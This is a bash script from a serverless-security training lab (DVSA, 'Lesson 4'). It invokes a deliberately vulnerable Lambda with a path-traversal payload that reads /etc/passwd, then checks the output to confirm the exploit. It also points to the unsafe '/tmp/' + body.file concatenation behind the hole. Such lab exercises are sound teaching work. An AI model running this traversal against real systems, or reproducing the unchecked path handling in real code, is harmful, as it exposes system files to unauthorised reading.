#!/bin/bash
# =============================================================
# Lesson 4 - Insecure Cloud Configuration: Path Traversal
# Invokes DVSA-ADMIN-SHELL with a path traversal payload to read
# /etc/passwd from the Lambda execution environment.
#
# Usage:
#   export ADMIN_USER_ID="e05ca99c-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
#   export REGION="eu-north-1"   # or us-east-1 if that is your region
#   bash run.sh
# =============================================================
set -u

REGION="${REGION:-eu-north-1}"
OUTPUT="/tmp/lesson4_response.json"

if [ -z "${ADMIN_USER_ID:-}" ]; then
  echo "ERROR: set ADMIN_USER_ID env var first." >&2
  echo "  Find it in: AWS Console -> DynamoDB -> DVSA-USERS-DB" >&2
  echo "  Copy the userId where isAdmin = true" >&2
  echo '  export ADMIN_USER_ID="e05ca99c-xxxx-xxxx-xxxx-xxxxxxxxxxxx"' >&2
  exit 1
fi

echo "============================================"
echo " Lesson 4: Insecure Cloud Configuration"
echo " Lambda : DVSA-ADMIN-SHELL"
echo " Region : $REGION"
echo "============================================"
echo ""
echo "[*] Invoking DVSA-ADMIN-SHELL with path traversal payload ..."

aws lambda invoke \
  --function-name DVSA-ADMIN-SHELL \
  --payload "{\"body\":{\"userId\":\"$ADMIN_USER_ID\",\"file\":\"../../etc/passwd\"}}" \
  --output json \
  "$OUTPUT" \
  --region "$REGION"

echo ""
echo "[*] Lambda response:"
cat "$OUTPUT" | python3 -m json.tool 2>/dev/null || cat "$OUTPUT"
echo ""

# Check for success
if cat "$OUTPUT" | python3 -c "
import json, sys
resp = json.load(sys.stdin)
body = resp.get('body', '')
if 'root:' in str(body):
    print('[!] EXPLOIT CONFIRMED: /etc/passwd contents returned!')
    print('    Path traversal successfully escaped /tmp/')
    exit(0)
else:
    print('[-] No /etc/passwd contents -- fix may be applied.')
    exit(1)
" 2>/dev/null; then
  true
fi

echo ""
echo "Verify:"
echo "  Lambda -> DVSA-ADMIN-SHELL -> admin_shell.js"
echo '  Look for: const filename = "/tmp/" + body.file;  // VULNERABLE'
